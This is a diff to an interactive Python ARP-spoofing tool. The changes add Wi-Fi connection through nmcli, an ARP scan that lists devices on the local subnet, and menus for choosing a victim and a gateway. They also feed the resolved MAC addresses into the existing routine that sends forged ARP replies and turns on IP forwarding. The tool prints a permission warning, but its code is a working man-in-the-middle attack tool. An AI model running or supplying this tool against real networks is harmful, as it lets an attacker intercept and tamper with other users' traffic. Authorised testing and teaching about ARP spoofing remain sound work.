@@ -6,8 +6,9 @@ import time
 import logging
 import subprocess
 import ipaddress
+import shutil
 from datetime import datetime
-from typing import List, Optional, Tuple, TextIO
+from typing import List, Optional, Tuple, TextIO, Dict
 
 logging.basicConfig(level=logging.INFO, format="%(message)s")
 
@@ -87,7 +88,34 @@ def get_interface_chipset(interface: str) -> str:
     return "unknown"
 
 
-def get_default_gateway() -> Tuple[Optional[str], Optional[str]]:
+def bring_interface_up(interface: str) -> None:
+    subprocess.run(["ip", "link", "set", interface, "up"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+
+def get_interface_ipv4(interface: str) -> Optional[Tuple[str, int]]:
+    result = subprocess.run(
+        ["ip", "-4", "addr", "show", "dev", interface],
+        stdout=subprocess.PIPE,
+        stderr=subprocess.DEVNULL,
+        text=True,
+        check=False,
+    )
+    if result.returncode != 0:
+        return None
+    for line in result.stdout.splitlines():
+        line = line.strip()
+        if line.startswith("inet "):
+            addr = line.split()[1]
+            if "/" in addr:
+                ip_str, prefix_str = addr.split("/", 1)
+                try:
+                    return ip_str, int(prefix_str)
+                except ValueError:
+                    return None
+    return None
+
+
+def get_default_interface() -> Optional[str]:
     result = subprocess.run(
         ["ip", "route", "show", "default"],
         stdout=subprocess.PIPE,
@@ -96,22 +124,165 @@ def get_default_gateway() -> Tuple[Optional[str], Optional[str]]:
         check=False,
     )
     if result.returncode != 0:
-        return None, None
+        return None
     for line in result.stdout.splitlines():
         parts = line.split()
-        gateway = None
-        interface = None
-        if "via" in parts:
-            idx = parts.index("via")
-            if idx + 1 < len(parts):
-                gateway = parts[idx + 1]
         if "dev" in parts:
             idx = parts.index("dev")
             if idx + 1 < len(parts):
-                interface = parts[idx + 1]
-        if gateway or interface:
-            return gateway, interface
-    return None, None
+                return parts[idx + 1]
+    return None
+
+
+def get_default_gateway(interface: Optional[str] = None) -> Optional[str]:
+    cmd = ["ip", "route", "show", "default"]
+    if interface:
+        cmd += ["dev", interface]
+    result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True, check=False)
+    if result.returncode != 0:
+        return None
+    for line in result.stdout.splitlines():
+        parts = line.split()
+        if "via" in parts:
+            idx = parts.index("via")
+            if idx + 1 < len(parts):
+                return parts[idx + 1]
+    return None
+
+
+def nmcli_available() -> bool:
+    return shutil.which("nmcli") is not None
+
+
+def nmcli_unescape(value: str) -> str:
+    return value.replace("\\:", ":").replace("\\\\", "\\")
+
+
+def list_wifi_networks(interface: str) -> List[Dict[str, str]]:
+    result = subprocess.run(
+        ["nmcli", "-t", "-f", "SSID,SECURITY,SIGNAL", "dev", "wifi", "list", "ifname", interface],
+        stdout=subprocess.PIPE,
+        stderr=subprocess.PIPE,
+        text=True,
+        check=False,
+    )
+    if result.returncode != 0:
+        logging.warning("Wi-Fi scan failed: %s", result.stderr.strip() or "unknown error")
+        return []
+
+    networks: Dict[str, Dict[str, str]] = {}
+    for line in result.stdout.splitlines():
+        line = line.strip()
+        if not line:
+            continue
+        parts = line.rsplit(":", 2)
+        if len(parts) != 3:
+            continue
+        ssid_raw, security, signal_raw = parts
+        ssid = nmcli_unescape(ssid_raw)
+        if not ssid:
+            continue
+        try:
+            signal = int(signal_raw)
+        except ValueError:
+            signal = -1
+        existing = networks.get(ssid)
+        if not existing or signal > int(existing.get("signal", "-1")):
+            networks[ssid] = {"ssid": ssid, "security": security, "signal": str(signal)}
+
+    return sorted(networks.values(), key=lambda item: int(item.get("signal", "-1")), reverse=True)
+
+
+def prompt_yes_no(message: str, default_yes: bool = True) -> bool:
+    try:
+        response = input(style(message, STYLE_BOLD)).strip().lower()
+    except EOFError:
+        return default_yes
+    if not response:
+        return default_yes
+    return response in {"y", "yes"}
+
+
+def connect_with_nmcli(interface: str) -> bool:
+    networks = list_wifi_networks(interface)
+    if networks:
+        logging.info("")
+        logging.info(style("Available Wi-Fi networks:", STYLE_BOLD))
+        for idx, network in enumerate(networks, start=1):
+            ssid = network["ssid"]
+            security = network["security"] or "--"
+            signal = network["signal"]
+            signal_label = f"{signal}%" if signal.isdigit() and int(signal) >= 0 else "?"
+            logging.info(
+                "  %s %s %s %s",
+                color_text(f"{idx})", COLOR_HIGHLIGHT),
+                ssid.ljust(28),
+                security.ljust(14),
+                signal_label,
+            )
+    else:
+        logging.warning("No Wi-Fi networks found (or scan failed).")
+
+    while True:
+        choice = input(
+            f"{style('Select network', STYLE_BOLD)} (number, M manual, Enter to cancel): "
+        ).strip().lower()
+        if not choice:
+            return False
+        if choice == "m":
+            ssid = input(f"{style('SSID', STYLE_BOLD)}: ").strip()
+            if not ssid:
+                logging.warning("SSID cannot be empty.")
+                continue
+            security = "manual"
+            break
+        if choice.isdigit() and networks:
+            idx = int(choice)
+            if 1 <= idx <= len(networks):
+                selection = networks[idx - 1]
+                ssid = selection["ssid"]
+                security = selection["security"]
+                break
+        logging.warning("Invalid selection. Try again.")
+
+    password = ""
+    if security == "manual":
+        password = input(f"{style('Wi-Fi password', STYLE_BOLD)} (leave empty for open/saved): ").strip()
+    elif security and security != "--":
+        password = input(f"{style('Wi-Fi password', STYLE_BOLD)} (leave empty to use saved): ").strip()
+    else:
+        if not prompt_yes_no("Open network detected. Connect? [Y/n]: "):
+            return False
+
+    cmd = ["nmcli", "dev", "wifi", "connect", ssid, "ifname", interface]
+    if password:
+        cmd += ["password", password]
+
+    result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=False)
+    if result.returncode != 0:
+        logging.warning("Failed to connect: %s", result.stderr.strip() or "unknown error")
+        return False
+
+    logging.info(color_text("Connected successfully.", COLOR_SUCCESS))
+    return True
+
+
+def ensure_interface_has_ip(interface: str) -> Optional[Tuple[str, int]]:
+    bring_interface_up(interface)
+    ip_info = get_interface_ipv4(interface)
+    if ip_info:
+        return ip_info
+
+    logging.warning("No IPv4 address found on %s.", interface)
+    if nmcli_available() and prompt_yes_no("Connect to Wi-Fi now? [Y/n]: "):
+        if connect_with_nmcli(interface):
+            time.sleep(3)
+            ip_info = get_interface_ipv4(interface)
+            if ip_info:
+                return ip_info
+
+    input(style("Connect the interface to a network and press Enter to retry.", STYLE_BOLD))
+    return get_interface_ipv4(interface)
 
 
 def select_interface(interfaces: List[str], default_iface: Optional[str]) -> str:
@@ -159,16 +330,6 @@ def prompt_ip(label: str, default_value: Optional[str] = None) -> str:
             logging.warning("Invalid IP address. Try again.")
 
 
-def prompt_yes_no(message: str, default_yes: bool = True) -> bool:
-    try:
-        response = input(style(message, STYLE_BOLD)).strip().lower()
-    except EOFError:
-        return default_yes
-    if not response:
-        return default_yes
-    return response in {"y", "yes"}
-
-
 def get_ip_forward_state() -> Optional[str]:
     path = "/proc/sys/net/ipv4/ip_forward"
     if not os.path.isfile(path):
@@ -214,6 +375,15 @@ def get_mac(ip_address: str, interface: str) -> Optional[str]:
     return None
 
 
+def resolve_mac(ip_address: str, interface: str) -> Optional[str]:
+    for _ in range(2):
+        mac = get_mac(ip_address, interface)
+        if mac:
+            return mac
+        time.sleep(0.5)
+    return None
+
+
 def send_spoof(dst_ip: str, dst_mac: str, src_ip: str, interface: str) -> None:
     if not ARP:
         return
@@ -226,6 +396,68 @@ def send_restore(dst_ip: str, dst_mac: str, src_ip: str, src_mac: str, interface
         return
     packet = ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
     send(packet, iface=interface, verbose=False, count=5)
+
+
+def arp_scan(network: ipaddress.IPv4Network, interface: str) -> List[Dict[str, str]]:
+    if not Ether or not ARP:
+        return []
+    answered, _ = srp(
+        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=str(network)),
+        timeout=2,
+        retry=1,
+        iface=interface,
+        verbose=False,
+    )
+    devices: Dict[str, str] = {}
+    for _, response in answered:
+        devices[response.psrc] = response.hwsrc
+    return [
+        {"ip": ip, "mac": mac}
+        for ip, mac in sorted(devices.items(), key=lambda item: ipaddress.ip_address(item[0]))
+    ]
+
+
+def print_devices(devices: List[Dict[str, str]], local_ip: str, gateway_ip: Optional[str]) -> None:
+    logging.info("")
+    logging.info(style("Discovered devices (ARP scan):", STYLE_BOLD))
+    if not devices:
+        logging.info(color_text("No devices found.", COLOR_WARNING))
+        return
+    for idx, device in enumerate(devices, start=1):
+        notes = []
+        if device["ip"] == local_ip:
+            notes.append("you")
+        if gateway_ip and device["ip"] == gateway_ip:
+            notes.append("gateway")
+        note_text = f" ({', '.join(notes)})" if notes else ""
+        logging.info(
+            "  %s %s %s%s",
+            color_text(f"{idx})", COLOR_HIGHLIGHT),
+            device["ip"].ljust(15),
+            device["mac"],
+            note_text,
+        )
+
+
+def select_scan_network(local_ip: str, prefix: int) -> ipaddress.IPv4Network:
+    network = ipaddress.ip_interface(f"{local_ip}/{prefix}").network
+    if network.num_addresses <= 1024:
+        return network
+
+    logging.warning(
+        "Detected a large network (%s, %d addresses).",
+        network,
+        network.num_addresses,
+    )
+    if prompt_yes_no("Limit scan to /24 around your IP? [Y/n]: "):
+        return ipaddress.ip_network(f"{local_ip}/24", strict=False)
+
+    while True:
+        custom = input(f"{style('Enter CIDR to scan', STYLE_BOLD)} (e.g. 192.168.1.0/24): ").strip()
+        try:
+            return ipaddress.ip_network(custom, strict=False)
+        except ValueError:
+            logging.warning("Invalid CIDR. Try again.")
 
 
 def create_log_file(prefix: str) -> Tuple[TextIO, str]:
@@ -268,13 +500,87 @@ def main() -> None:
     logging.info(style("IMPORTANT:", COLOR_WARNING, STYLE_BOLD))
     logging.info("Use only on networks you own or have explicit permission to test.")
 
-    default_gateway, default_iface = get_default_gateway()
     interfaces = list_network_interfaces()
+    default_iface = get_default_interface()
     interface = select_interface(interfaces, default_iface)
 
-    logging.info("")
-    target_ip = prompt_ip("Target IP")
-    gateway_ip = prompt_ip("Gateway IP", default_gateway)
+    ip_info = ensure_interface_has_ip(interface)
+    if not ip_info:
+        logging.error("Interface %s has no IPv4 address. Connect first and retry.", interface)
+        input(style("Press Enter to return.", STYLE_BOLD))
+        return
+
+    local_ip, prefix = ip_info
+    gateway_ip = get_default_gateway(interface)
+    scan_network = select_scan_network(local_ip, prefix)
+
+    target_ip = None
+    devices: List[Dict[str, str]] = []
+    while True:
+        target_ip = None
+        logging.info("")
+        logging.info(style(f"Scanning {scan_network} on {interface}...", STYLE_BOLD))
+        devices = arp_scan(scan_network, interface)
+        print_devices(devices, local_ip, gateway_ip)
+
+        logging.info("")
+        choice = input(
+            f"{style('Select target', STYLE_BOLD)} (number, M manual, R rescan, Q quit): "
+        ).strip().lower()
+        if choice == "q":
+            return
+        if choice == "r":
+            target_ip = None
+            continue
+        if choice == "m":
+            target_ip = prompt_ip("Target IP")
+        elif choice.isdigit() and devices:
+            idx = int(choice)
+            if 1 <= idx <= len(devices):
+                target_ip = devices[idx - 1]["ip"]
+            else:
+                logging.warning("Invalid selection. Try again.")
+                continue
+        else:
+            logging.warning("Invalid selection. Try again.")
+            continue
+
+        if target_ip == local_ip:
+            logging.warning("Target cannot be your own IP.")
+            target_ip = None
+            continue
+        if gateway_ip and target_ip == gateway_ip:
+            logging.warning("Target cannot be the gateway.")
+            target_ip = None
+            continue
+
+        if gateway_ip and prompt_yes_no(f"Use detected gateway {gateway_ip}? [Y/n]: "):
+            break
+
+        gateway_ip = None
+        while not gateway_ip:
+            choice = input(
+                f"{style('Select gateway', STYLE_BOLD)} (number, M manual, R rescan, Q quit): "
+            ).strip().lower()
+            if choice == "q":
+                return
+            if choice == "r":
+                target_ip = None
+                break
+            if choice == "m":
+                gateway_ip = prompt_ip("Gateway IP")
+            elif choice.isdigit() and devices:
+                idx = int(choice)
+                if 1 <= idx <= len(devices):
+                    gateway_ip = devices[idx - 1]["ip"]
+                else:
+                    logging.warning("Invalid selection. Try again.")
+            else:
+                logging.warning("Invalid selection. Try again.")
+
+        if target_ip is None:
+            continue
+        break
 
     logging.info("")
     if not prompt_yes_no("Start ARP spoofing? [Y/n]: "):
@@ -294,8 +600,9 @@ def main() -> None:
         else:
             log_event(log_handle, "Failed to enable IP forwarding.", COLOR_WARNING)
 
-    target_mac = get_mac(target_ip, interface)
-    gateway_mac = get_mac(gateway_ip, interface)
+    mac_lookup = {device["ip"]: device["mac"] for device in devices}
+    target_mac = mac_lookup.get(target_ip) or resolve_mac(target_ip, interface)
+    gateway_mac = mac_lookup.get(gateway_ip) or resolve_mac(gateway_ip, interface)
 
     if not target_mac or not gateway_mac:
         log_event(log_handle, "Failed to resolve target or gateway MAC address.", COLOR_ERROR)
